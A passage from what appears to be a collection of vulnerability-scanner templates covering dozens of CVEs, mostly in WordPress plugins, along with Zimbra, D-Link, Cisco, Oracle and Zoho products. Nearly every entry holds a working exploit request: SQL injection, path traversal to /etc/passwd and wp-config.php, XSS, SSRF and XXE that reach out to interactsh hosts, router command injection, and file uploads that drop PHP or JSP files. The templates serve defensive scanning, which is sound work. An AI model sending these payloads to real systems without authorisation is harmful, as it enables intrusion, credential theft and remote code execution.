GET /wp-content/plugins/wpcargo/includes/barcode.php?text=x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx&sizefactor=.090909090909&size=1&filepath={{randstr}}.php HTTP/1.1
Host: {{Hostname}}

```

### Step - 3

```
POST /wp-content/plugins/wpcargo/includes/{{randstr}}.php?1=var_dump HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

2={{md5(num)}}

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_1 != 200
  2. status_code_2 == 200
  3. status_code_3 == 200
  4. contains(body_3, md5(num))
  5. contains(body_3, 'PNG')
- condition - and

---

# WordPress Statistics \<13.0.8 - Blind SQL Injection

## Description

- WordPress Statistic plugin versions prior to version 13.0.8 are affected by an unauthenticated time-based blind SQL injection vulnerability.
- severity - high
- tags - cve,wp-plugin,unauth,wpscan,cve2021,wordpress,sqli,blind,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/wp-statistics/readme.txt

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. WP Statistics
- part - body

**Type - dsl**

- dsl
  1. compare_versions(version, '\< 13.0.8')

### Extractors

**Type - regex**

- name - version
- internal - True
- group - 1
- regex
  1. (?m)Stable tag: ([0-9.]+)

**Type - regex**

- group - 1
- regex
  1. (?m)Stable tag: ([0-9.]+)

---

# Oracle Access Manager - Remote Code Execution

## Description

- The Oracle Access Manager portion of Oracle Fusion Middleware (component: OpenSSO Agent) is vulnerable to remote code execution. Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. This is an easily exploitable vulnerability that allows unauthenticated attackers with network access via HTTP to compromise Oracle Access Manager.

- severity - critical
- tags - cve,cve2021,oam,rce,java,unauth,oracle,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/oam/server/opensso/sessionservice

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- part - header
- words
  1. x-oracle-dms-ecid
  2. x-oracle-dms-rid
- condition - or
- case-insensitive - True

**Type - word**

- part - body
- words
  1. /oam/pages/css/general.css

---

# Apache APISIX Dashboard \<2.10.1 - API Unauthorized Access

## Description

- In Apache APISIX Dashboard before 2.10.1, the Manager API uses two frameworks and introduces framework `droplet` on the basis of framework `gin.' While all APIs and authentication middleware are developed based on framework `droplet`,  some API directly use the interface of framework `gin` thus bypassing their authentication.
- severity - critical
- tags - cve,cve2021,apache,unauth,apisix

## Requests

- Method - GET

### URL

- {{RootURL}}/apisix/admin/migrate/export

### Matchers

**Type - word**

- words
  1. "Consumers":

**Type - status**

- status
  1. 200

---

# WordPress True Ranker \<2.2.4 - Local File Inclusion

## Description

- WordPress True Ranker before version 2.2.4 allows sensitive configuration files such as wp-config.php, to be accessed via the src parameter found in the ~/admin/vendor/datatables/examples/resources/examples.php file via local file inclusion.
- severity - high
- tags - unauth,lfr,wpscan,cve,cve2021,wp-plugin,lfi,wp,wordpress

## Requests

### Step - 1

```
POST /wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

src=%2Fscripts%2Fsimple.php%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwp-config.php

```

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# Like Button Rating \< 2.6.32 - Unauthenticated Full-Read SSRF

## Description

- The LikeBtn WordPress plugin was vulnerable to Unauthenticated Full-Read Server-Side Request Forgery (SSRF).

- severity - high
- tags - cve,cve2021,wordpress,wp-plugin,wp,ssrf,wpscan,unauth,likebtn-like-button

## Requests

### Step - 1

```
@timeout: 10s
GET /wp-admin/admin-ajax.php?action=likebtn_prx&likebtn_q={{base64('http://likebtn.com.interact.sh')}}" HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. Interactsh Server

**Type - status**

- status
  1. 200

---

# Clansphere CMS 2011.4 - Cross-Site Scripting

## Description

- Clansphere CMS 2011.4 contains an unauthenticated reflected cross-site scripting vulnerability via the "module" parameter.

- severity - medium
- tags - cve,cve2021,clansphere,xss,cms,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/mods/clansphere/lang_modvalidate.php?language=language&module=module%22>\</script>\<script>alert(document.domain)\</script>

### Matchers

**Type - word**

- part - body
- words
  1. ">\</script>\<script>alert(document.domain)\</script>.php

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# TermTalk Server 3.24.0.2 - Unauthenticated Arbitrary File Read

## Description

- A Directory Traversal vulnerability exists in Solari di Udine TermTalk Server (TTServer) 3.24.0.2, which lets an unauthenticated malicious user gain access to the files on the remote system by gaining access to the relative path of the file they want to download.

- severity - high
- tags - cve,cve2021,termtalk,lfi,unauth,lfr,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/file?valore=../../../../../windows/win.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# Debug Endpoint pprof - Exposure Detection

## Description

- The debugging endpoint /debug/pprof is exposed over the unauthenticated Kubelet healthz port. This debugging endpoint can potentially leak sensitive information such as internal Kubelet memory addresses and configuration, or for limited denial of service. Versions prior to 1.15.0, 1.14.4, 1.13.8, and 1.12.10 are affected. The issue is of medium severity, but not exposed by the default configuration.

- severity - high
- tags - cve,cve2019,debug,kubernetes,kubelet,devops,unauth,disclosure

## Requests

- Method - GET

### URL

- {{BaseURL}}/debug/pprof/
- {{BaseURL}}/debug/pprof/goroutine?debug=1

### Matchers

**Type - word**

- words
  1. Types of profiles available:
  2. Profile Descriptions
  3. goroutine profile: total
- condition - or

---

# Visualizer \<3.3.1 - Blind Server-Side Request Forgery

## Description

- Visualizer prior to 3.3.1 suffers from a blind server-side request forgery vulnerability via the /wp-json/visualizer/v1/upload-data endpoint.

- severity - critical
- tags - cve,cve2019,wp-plugin,ssrf,wordpress,xss,unauth,wpscan

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/wp-json/visualizer/v1/upload-data
  - {\"url\":\"http://{{interactsh-url}}\"}

### Matchers

**Type - word**

- part - interactsh_protocol
- name - http
- words
  1. http

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# WordPress Visualizer \<3.3.1 - Cross-Site Scripting

## Description

- WordPress Visualizer plugin before 3.3.1 contains a stored cross-site scripting vulnerability via /wp-json/visualizer/v1/update-chart WP-JSON API endpoint. An unauthenticated attacker can execute arbitrary JavaScript when an admin or other privileged user edits the chart via the admin dashboard.

- severity - medium
- tags - cve,cve2019,wp-plugin,wordpress,wp,xss,unauth,wpscan

## Requests

### Step - 1

```
POST /wp-json/visualizer/v1/update-chart HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"id": 7, "visualizer-chart-type": "<script>alert(document.domain)</script>"}

```

### Matchers

**Type - word**

- part - body
- words
  1. {"success":"Chart updated"}

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# T24 Web Server - Local File Inclusion

## Description

- T24 web server is vulnerable to unauthenticated local file inclusion that permits an attacker to exfiltrate data directly from server.
- severity - high
- tags - cve,cve2019,temenos,lfi,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/WealthT24/GetImage?docDownloadPath=/etc/passwd
- {{BaseURL}}/WealthT24/GetImage?docDownloadPath=c:/windows/win.ini

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
  2. for 16-bit app support
- condition - or

**Type - status**

- status
  1. 200

---

# WordPress Google Maps \<7.11.18 - SQL Injection

## Description

- WordPress Google Maps plugin before 7.11.18 contains a SQL injection vulnerability. The plugin includes /class.rest-api.php in the REST API and does not sanitize field names before a SELECT statement. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - cve,cve2019,wp,wp-plugin,unauth,sqli,wordpress,googlemaps,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/?rest_route=/wpgmza/v1/markers&filter=%7b%7d&fields=%2a%20from%20wp_users--%20-

### Matchers

**Type - word**

- part - body
- words
  1. "user_login"
  2. "user_pass"
  3. "user_nicename"
- condition - and

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# Cisco Prime Infrastructure and Cisco Evolved Programmable Network Manager - Remote Code Execution

## Description

- Cisco Prime Infrastructure (PI) and Cisco Evolved Programmable Network (EPN) Manager could allow an authenticated, remote attacker to execute code with root-level privileges on the underlying operating system. This vulnerability exist because the software improperly validates user-supplied input. An attacker could exploit this vulnerability by uploading a malicious file to the administrative web interface. A successful exploit could allow the attacker to execute code with root-level privileges on the underlying operating system.
- severity - critical
- tags - cve,cve2019,rce,fileupload,unauth,intrusive,cisco

## Requests

### Step - 1

```
POST /servlet/UploadServlet HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Primary-IP: 127.0.0.1
Filename: test.tar
Filesize: 10240
Compressed-Archive: false
Destination-Dir: tftpRoot
Filecount: 1
Content-Length: 269
Content-Type: multipart/form-data; boundary=871a4a346a547cf05cb83f57b9ebcb83

--871a4a346a547cf05cb83f57b9ebcb83
Content-Disposition: form-data; name="files"; filename="test.tar"

../../opt/CSCOlumos/tomcat/webapps/ROOT/test.txt0000644000000000000000000000000400000000000017431 0ustar  00000000000000{{randstr}}
--871a4a346a547cf05cb83f57b9ebcb83--

```

### Step - 2

```
GET /test.txt HTTP/1.1
Host: {{Host}}

```

### Matchers

**Type - dsl**

- dsl
  1. status_code == 200
  2. contains((body_2), '{{randstr}}')
- condition - and

---

# Authentication Bypass InfluxDB

## Description

- InfluxDB before 1.7.6 has an authentication bypass vulnerability in the authenticate function in services/httpd/handler.go because a JWT token may have an empty SharedSecret (aka shared secret).
- severity - critical
- tags - unauth,db,influxdb,misconfig

## Requests

- Method - GET

### URL

- {{BaseURL}}/query?db=db&q=SHOW%20DATABASES

### Matchers

**Type - word**

- part - body
- words
  1. "results":
  2. "name":"databases"
- condition - and

**Type - status**

- status
  1. 200

---

# D-Link Routers - Remote Code Execution

## Description

- D-Link products such as DIR-655C, DIR-866L, DIR-652, and DHP-1565 contain an unauthenticated remote code execution vulnerability. The issue occurs when the attacker sends an arbitrary input to a "PingTest" device common gateway interface that could lead to common injection. An attacker who successfully triggers the command injection could achieve full system compromise. Later, it was independently found that these issues also affected; DIR-855L, DAP-1533, DIR-862L, DIR-615, DIR-835, and DIR-825.
- severity - critical
- tags - cve,cve2019,dlink,rce,router,unauth,kev

## Requests

### Step - 1

```
POST /apply_sec.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}

html_response_page=login_pic.asp&login_name=YWRtaW4%3D&log_pass=&action=do_graph_auth&login_n=admin&tmp_log_pass=&graph_code=&session_id=62384

```

### Step - 2

```
POST /apply_sec.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}/login_pic.asp
Cookie: uid=1234123

html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0a{{url_encode('cat /etc/passwd')}}

```

### Step - 3

```
POST /apply_sec.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}/login_pic.asp
Cookie: uid=1234123

html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0a{{url_encode('type C:\\Windows\\win.ini')}}

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:
  2. \[(font|extension|file)s\]
- condition - or

**Type - status**

- status
  1. 200

---

# MultiSafepay plugin for WooCommerce \<= 4.13.1 - Unauthenticated Arbitrary File Read

## Description

- Unauthenticated Arbitrary File Read vulnerability in MultiSafepay plugin for WooCommerce plugin \<= 4.13.1 at WordPress.

- severity - high
- tags - cve,cve2022,wp-plugin,wp,wordpress,unauth,multisafepay,woocommerce

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=admin_init&log_filename=../../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - word**

- part - header
- words
  1. application/octet-stream

**Type - status**

- status
  1. 200

---

# WP Fundraising Donation and Crowdfunding Platform \< 1.5.0 - Unauthenticated SQLi

## Description

- The WP Fundraising Donation and Crowdfunding Platform WordPress plugin before 1.5.0 does not sanitise and escape a parameter before using it in a SQL statement via one of it's REST route, leading to an SQL injection exploitable by unauthenticated users.

- severity - critical
- tags - cve,sqli,wordpress,wp-plugin,cve2022,wp,wp-fundraising-donation,unauth,wpscan

## Requests

### Step - 1

```
@timeout: 10s
GET /index.php?rest_route=/xs-donate-form/payment-redirect/3 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"id": "(SELECT 1 FROM (SELECT(SLEEP(6)))me)", "formid": "1", "type": "online_payment"}

```

### Matchers

**Type - dsl**

- dsl
  1. duration>=6
  2. status_code == 200
  3. contains(content_type, "application/json")
  4. contains(body, "Invalid payment.")
- condition - and

---

# Zimbra Collaboration Suite 8.8.15/9.0 - Remote Code Execution

## Description

- Zimbra Collaboration Suite (ZCS) 8.8.15 and 9.0 has mboximport functionality that receives a ZIP archive and extracts files from it. By bypassing authentication (i.e., not having an authtoken), an attacker can upload arbitrary files to the system, leading to directory traversal and remote code execution. NOTE: this issue exists because of an incomplete fix for CVE-2022-27925.

- severity - critical
- tags - cve,cve2022,zimbra,rce,unauth,kev

## Requests

### Step - 1

```
POST {{path}} HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
content-type: application/x-www-form-urlencoded

{{hex_decode("504b0304140008000800000000000000000000000000000000003d0000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a73701cc8bd0ac2301000e0bd4f510285042128b8555cfc5bc4163bb4743bdb4353cf24c64bf4f145d76f55642eb2f6c158262bc569b8b4e3bc3bc0046db3dc3e443ecb45957ad8dc3fc705d4bbaeeaa3506566f19d4f90401ba7f7865082f7640660e3acbe229f11a806bec980cf882ffe59832111f29f95527a444246a9caac587f030000ffff504b0708023fdd5d8500000089000000504b0304140008000800000000000000000000000000000000003d0000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a73701cc8bd0ac2301000e0bd4f510285042128b8555cfc5bc4163bb4743bdb4353cf24c64bf4f145d76f55642eb2f6c158262bc569b8b4e3bc3bc0046db3dc3e443ecb45957ad8dc3fc705d4bbaeeaa3506566f19d4f90401ba7f7865082f7640660e3acbe229f11a806bec980cf882ffe59832111f29f95527a444246a9caac587f030000ffff504b0708023fdd5d8500000089000000504b0102140014000800080000000000023fdd5d85000000890000003d00000000000000000000000000000000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a7370504b0102140014000800080000000000023fdd5d85000000890000003d00000000000000000000000000f00000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a7370504b05060000000002000200d6000000e00100000000")}}

```

### Step - 2

```
GET /zimbraAdmin/0MVzAe6pgwe5go1D.jsp HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_1 == 401
  2. status_code_2 == 200
  3. contains(body_2,'NcbWd0XGajaWS4DmOvZaCkxL1aPEXOZu')
- condition - and

**Payloads**- path

---

# WordPress Videos sync PDF \<=1.7.4 - Local File Inclusion

## Description

- WordPress Videos sync PDF 1.7.4 and prior does not validate the p parameter before using it in an include statement, which could lead to local file inclusion.
- severity - high
- tags - lfi,wp-plugin,unauth,wpscan,cve,cve2022,packetstorm,wp,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=tout

### Matchers

**Type - word**

- part - body
- words
  1. failed to open stream: No such file or directory
  2. REPERTOIRE_VIDEOSYNCPDFreglages/Menu_Plugins/tout.php
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress HTML2WP \<=1.0.0 - Arbitrary File Upload

## Description

- WordPress HTML2WP plugin through 1.0.0 contains an arbitrary file upload vulnerability. The plugin does not perform authorization and CSRF checks when importing files and does not validate them. As a result, an attacker can upload arbitrary files on the remote server.

- severity - critical
- tags - wp-plugin,wp,fileupload,unauth,wpscan,cve2022,wordpress,intrusive,cve,html2wp

## Requests

### Step - 1

```
POST /wp-admin/admin.php?page=html2wp-settings HTTP/1.1
Host: {{Hostname}}
Content-Length: 253
Content-Type: multipart/form-data; boundary=---------------------------7816508136577551742878603990
Connection: close

-----------------------------7816508136577551742878603990
Content-Disposition: form-data; name="local_importing[]"; filename="{{randstr}}.php"
Content-Type: text/html

<?php

echo "File Upload success";

-----------------------------7816508136577551742878603990--

```

### Step - 2

```
GET /wp-content/uploads/html2wp/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_1 == 302
  2. status_code_2 == 200
  3. contains(body_2, 'File Upload success')
- condition - and

---

# Member Hero \<= 1.0.9 - Unauthenticated Remote Code Execution

## Description

- The Member Hero WordPress plugin through 1.0.9 lacks authorization checks, and does not validate the a request parameter in an AJAX action, allowing unauthenticated users to call arbitrary PHP functions with no arguments.

- severity - critical
- tags - unauth,wpscan,wp-plugin,rce,wp,wordpress,member-hero,cve,cve2022

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=memberhero_send_form&\_memberhero_hook=phpinfo

### Matchers

**Type - word**

- words
  1. PHP Extension
  2. PHP Version
  3. \<!DOCTYPE html
- condition - and

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- part - body
- group - 1
- regex
  1. > PHP Version \<\/td>\<td class="v">([0-9.]+)

---

# Atlassian Jira addon Netic Group Export \< 1.0.3 - Unauthenticated Access

## Description

- The Netic Group Export add-on before 1.0.3 for Atlassian Jira does not perform authorization checks. This might allow an unauthenticated user to export all groups from the Jira instance by making a groupexport_download=true request to a plugins/servlet/groupexportforjira/admin/ URI.

- severity - medium
- tags - cve,cve2022,atlassian,jira,netic,unauth

## Requests

### Step - 1

```
POST /plugins/servlet/groupexportforjira/admin/json HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

groupexport_searchstring=&groupexport_download=true

```

### Matchers

**Type - word**

- part - body
- words
  1. "jiraGroupObjects"
  2. "groupName"
- condition - and

**Type - word**

- part - header
- words
  1. attachment
  2. jira-group-export
- condition - and

**Type - status**

- status
  1. 200

---

# Directorist \< 7.3.1 - Unauthenticated Email Address Disclosure

## Description

- The plugin discloses the email address of all users in an AJAX action available to both unauthenticated and any authenticated users
- severity - medium
- tags - cve,cve2022,wp-plugin,wpscan,wordpress,wp,directorist,unauth,disclosure

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=directorist_author_pagination

### Matchers

**Type - word**

- part - body
- words
  1. directorist-authors**card**details\_\_top
  2. directorist-authors**card**info-list
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Simply Schedule Appointments \< 1.5.7.7 - Email Address Disclosure

## Description

- The Simply Schedule Appointments WordPress plugin before 1.5.7.7 is missing authorisation in a REST endpoint, allowing unauthenticated users to retrieve WordPress users details such as name and email address.

- severity - medium
- tags - simply-schedule-appointments,unauth,wpscan,cve,cve2022,wordpress,wp-plugin,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-json/ssa/v1/users

### Matchers

**Type - regex**

- regex
  1. response_code":200
  2. "email":"([a-zA-Z-_0-9@.]+)","display*name":"([a-zA-Z-_0-9@.]+)","gravatar_url":"http?:\\\/\\\/([a-z0-9A-Z.\\\/?=&@*-]+)"
- condition - and

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# Zoho ManageEngine ADAudit Plus \<7600 - XML Entity Injection/Remote Code Execution

## Description

- Zoho ManageEngine ADAudit Plus before version 7060 is vulnerable to an
  unauthenticated XML entity injection attack that can lead to remote code execution.

- severity - critical
- tags - cve,cve2022,xxe,rce,zoho,manageengine,unauth

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/api/agent/tabs/agentData
  - [
    {
    "DomainName": "{{Host}}",
    "EventCode": 4688,
    "EventType": 0,
    "TimeGenerated": 0,
    "Task Content": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><! foo [ <!ENTITY % xxe SYSTEM \"http://{{interactsh-url}}\"> %xxe; ]>"
    }
    ]

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

**Type - word**

- part - body
- words
  1. ManageEngine

---

# uDraw \<3.3.3 - Local File Inclusion

## Description

- uDraw before 3.3.3 does not validate the url parameter in its udraw_convert_url_to_base64 AJAX action (available to both unauthenticated and authenticated users) before using it in the file_get_contents function and returning its content base64 encoded in the response. As a result, unauthenticated users could read arbitrary files on the web server (such as /etc/passwd, wp-config.php etc).
- severity - high
- tags - wp,wordpress,wp-plugin,unauth,cve,cve2022,lfi,udraw,wpscan

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

action=udraw_convert_url_to_base64&url=/etc/passwd

```

### Matchers

**Type - word**

- words
  1. cm9vd
  2. data:image\/;base64
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress WooCommerce \<3.1.2 - Arbitrary Function Call

## Description

- WordPress WooCommerce plugin before 3.1.2 does not have authorisation and CSRF checks in the wpt_admin_update_notice_option AJAX action (available to both unauthenticated and authenticated users), as well as does not validate the callback parameter, allowing unauthenticated attackers to call arbitrary functions with either none or one user controlled argument.
- severity - critical
- tags - wpscan,wp,wp-plugin,wordpress,cve,cve2022,unauth

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php?action=wpt_admin_update_notice_option HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

option_key=a&perpose=update&callback=phpinfo

```

### Matchers

**Type - word**

- words
  1. PHP Extension
  2. PHP Version
- condition - and

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- part - body
- group - 1
- regex
  1. > PHP Version \<\/td>\<td class="v">([0-9.]+)

---

# WordPress Gallery \<2.0.0 - Cross-Site Scripting

## Description

- WordPress Gallery plugin before 2.0.0 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape a parameter before outputting it back in the response of an AJAX action, available to both unauthenticated and authenticated users.
- severity - medium
- tags - wpscan,cve2022,wp,xss,wordpress,gallery,unauth,cve,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=wpda_gall_load_image_info&start=0&limit=1&gallery_current_index=\<script>alert(document.domain)\</script>

### Matchers

**Type - word**

- part - body
- words
  1. wpdevar_gall_img_url_h[\<script>alert(document.domain)\</script>]

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# All In One Video Gallery Plugin - Unauthenticated Arbitrary File Download & SSRF vulnerability

## Description

- Unauthenticated Arbitrary File Download & SSRF vulnerability in WordPress All In One Video Gallery Plugin (versions \<= 2.6.0).

- tags - cve2022,wp-plugin,unauth,ssrf,wpscan,cve,wordpress,wp,all-in-one-video-gallery

## Requests

### Step - 1

```
@timeout: 10s
GET /index.php/video/?dl={{base64('http://interact.sh/')}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. Interactsh Server

**Type - status**

- status
  1. 200

---

# Formcraft3 \<3.8.28 - Server-Side Request Forgery

## Description

- Formcraft3 before version 3.8.2 does not validate the URL parameter in the formcraft3_get AJAX action, leading to server-side request forgery issues exploitable by unauthenticated users.
- severity - critical
- tags - wp,wp-plugin,wordpress,cve,formcraft3,wpscan,ssrf,cve2022,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=formcraft3_get&URL=https://{{interactsh-url}}

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# Redis Sandbox Escape - Remote Code Execution

## Description

- This template exploits CVE-2022-0543, a Lua-based Redis sandbox escape. The
  vulnerability was introduced by Debian and Ubuntu Redis packages that
  insufficiently sanitized the Lua environment. The maintainers failed to
  disable the package interface, allowing attackers to load arbitrary libraries.

- severity - critical
- tags - cve,cve2022,network,redis,unauth,rce,kev

---

# WordPress Nirweb Support \<2.8.2 - SQL Injection

## Description

- WordPress Nirweb support plugin before 2.8.2 contains a SQL injection vulnerability. The plugin does not sanitize and escape a parameter before using it in a SQL statement via an AJAX action. An attacker can possibly obtain sensitive information from a database, modify data, and/or execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - cve,cve2022,wordpress,wp-plugin,wp,sqli,wpscan,nirweb-support,unauth

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=answerd_ticket&id_form=1 UNION ALL SELECT NULL,NULL,md5({{num}}),NULL,NULL,NULL,NULL,NULL-- -

```

### Matchers

**Type - word**

- part - body
- words
  1. {{md5(num)}}

**Type - status**

- status
  1. 200

---

# Pricing Deals for WooCommerce \< 2.0.3 - Unauthenticated SQL Injection

## Description

- The Pricing Deals for WooCommerce WordPress plugin through 2.0.2.02 does not properly sanitise and escape a parameter before using it in a SQL statement via an AJAX action available to unauthenticated users, leading to an unauthenticated SQL injection.

- severity - critical
- tags - cve,cve2022,sqli,wpscan,wordpress,wp-plugin,wp,pricing-deals-for-woocommerce,unauth

## Requests

### Step - 1

```
@timeout: 15s
GET /wp-admin/admin-ajax.php?action=vtprd_product_search_ajax&term=aaa%27+union+select+1,sleep(6),3--+- HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. duration>=6
  2. status_code == 500
  3. contains(body, "been a critical error")
- condition - and

---

# VoipMonitor - Pre-Auth SQL Injection

## Description

- A SQL injection vulnerability in Voipmonitor GUI before v24.96 allows attackers to escalate privileges to the Administrator level.
- severity - critical
- tags - cve,cve2022,voipmonitor,sqli,unauth

## Requests

### Step - 1

```
POST /api.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded

module=relogin&action=login&pass=nope&user=a' UNION SELECT 'admin','admin',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null; #

```

### Matchers

**Type - word**

- words
  1. "success":true
  2. \_vm_version
  3. \_debug
- condition - and

**Type - status**

- status
  1. 200

### Extractors

**Type - kval**

- kval
  1. PHPSESSID

---

# Dapr Dashboard - Unauthorized Access

## Description

- Dapr Dashboard v0.1.0 through v0.10.0 is vulnerable to Incorrect Access Control that allows attackers to obtain sensitive data.

- severity - high
- tags - cve,cve2022,dapr,dashboard,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/components/statestore
- {{BaseURL}}/overview
- {{BaseURL}}/controlplane

### Matchers

**Type - word**

- part - body
- words
  1. \<title>Dapr Dashboard\</title>

**Type - status**

- status
  1. 200

---

# Zoho ManageEngine - Remote Code Execution

## Description

- Zoho ManageEngine Password Manager Pro, PAM 360, and Access Manager Plus are susceptible to unauthenticated remote code execution via XML-RPC. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

- severity - critical
- tags - cve,cve2022,rce,zoho,passwordmanager,deserialization,unauth,msf,kev

## Requests

- Method - POST
- Method - POST

### URL

- {{RootURL}}/xmlrpc
  - <?xml version="1.0"?><methodCall><methodName>{{randstr}}</methodName><params><param><value>big0us</value></param></params></methodCall>

---

# Welcart eCommerce \<= 2.7.7 - Unauth Directory Traversal

## Description

- Unauth. Directory Traversal vulnerability in Welcart eCommerce plugin \<= 2.7.7 on WordPress.

- severity - critical
- tags - cve,cve2022,wp-plugin,wordpress,wp,lfi,unauth,usc-e-shop

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/usc-e-shop/functions/progress-check.php?progressfile=../../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# Daily Prayer Time \< 2022.03.01 - Unauthenticated SQLi

## Description

- The Daily Prayer Time WordPress plugin before 2022.03.01 does not sanitise and escape the month parameter before using it in a SQL statement via the get_monthly_timetable AJAX action (available to unauthenticated users), leading to an unauthenticated SQL injection.

- severity - critical
- tags - sqli,wordpress,wp-plugin,unauth,daily-prayer-time-for-mosques,wpscan,cve,cve2022,wp

## Requests

### Step - 1

```
@timeout: 10s
GET /wp-admin/admin-ajax.php?action=get_monthly_timetable&month=1+AND+(SELECT+6881+FROM+(SELECT(SLEEP(6)))iEAn) HTTP/1.1
